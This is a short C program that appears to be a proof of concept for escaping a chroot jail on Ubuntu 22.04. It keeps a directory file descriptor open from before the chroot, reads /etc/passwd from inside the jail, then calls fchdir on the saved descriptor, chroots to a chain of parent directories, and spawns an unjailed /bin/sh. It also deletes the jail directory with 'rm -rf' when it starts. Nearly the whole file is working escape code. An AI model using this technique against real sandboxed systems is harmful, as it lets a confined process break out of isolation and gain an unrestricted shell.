// OS: Ubuntu 22.04.1 64bit Desktop.
#include <stdio.h> 
#include <errno.h> 
#include <fcntl.h> 
#include <string.h> 
#include <unistd.h> 
#include <limits.h>

int _getcwd() {
   char cwd[PATH_MAX];
   if (getcwd(cwd, sizeof(cwd)) != NULL) {
       printf("Current working dir: %s\n", cwd);
   } else {
       perror("getcwd() error");
       return 1;
   }
   return 0;
}

int main(){
    _getcwd();
    system("rm -rf jail; mkdir jail 2>/dev/null");

    // get a dfd outside chroot. before we jail this process.
    int hole = open(".", 0);
    printf("dfd: %d\n", hole);

    int ret;
    if((ret = chroot("jail"))<0) { 
        fprintf(stderr, "Failed to chroot to error:%s\n",strerror(errno)); 
        exit(1); 
    }
    ret = chdir("/");   // proper
    printf("chdir ret: %d, %s\n", ret, strerror(errno));
    _getcwd();

    printf("are we in jail?\n");
    int fd = open("/etc/passwd", O_RDONLY);
    char buf[32] = "yes. we are locked.\n\x00";
    read(fd, buf, 32);
    write(1, buf, 32);

    // see if this works.
    printf("can we recover original root via hole?\n");  
    ret = fchdir(hole);		// escape current dir! (use dfd outside chroot)
    _getcwd();			// undefined!
    chroot("../../../../../../../../../"); // now we can escape root!
    system("/bin/sh");		// unjailed shell
} 

